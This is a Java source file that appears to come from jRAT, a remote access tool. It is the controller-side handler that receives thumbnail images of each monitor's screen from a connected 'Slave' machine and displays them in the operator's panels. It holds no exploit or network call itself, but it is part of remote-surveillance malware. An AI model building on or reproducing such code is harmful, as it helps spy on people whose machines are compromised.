package jrat.module.screen.packets;

import graphslib.monitors.PanelMonitors.PanelMonitor;
import jrat.common.utils.ImageUtils;
import jrat.controller.Slave;
import jrat.controller.packets.incoming.IncomingPacket;
import jrat.controller.ui.frames.FrameControlPanel;
import jrat.controller.ui.panels.PanelControlMonitors;
import jrat.module.screen.ui.DialogPickMonitor;

import java.awt.image.BufferedImage;
import java.util.List;

/**
 * Packet contains a thumbnail for each available monitor
 */
public class PacketReceiveAllThumbnails implements IncomingPacket {

	@Override
	public void read(Slave slave) throws Exception {
		int monitors = slave.readInt();
		
		for (int i = 0; i < monitors; i++) {
			int len = slave.readInt();
			
			byte[] buffer = new byte[len];

            slave.readFully(buffer);
			
			BufferedImage image = ImageUtils.decodeImage(buffer);
			
			DialogPickMonitor dialog = DialogPickMonitor.instances.get(slave);
			if (dialog != null) {
				List<PanelMonitor> panels = dialog.getPanelMonitors().getPanels();
				panels.get(i).setThumbnail(image);
			}
			
			FrameControlPanel frame = FrameControlPanel.instances.get(slave);
			if (frame != null) {
				PanelControlMonitors panel = (PanelControlMonitors) frame.panels.get("monitors");
				panel.getPanelMonitors().getPanels().get(i).setThumbnail(image);
			}
		}
	}

}
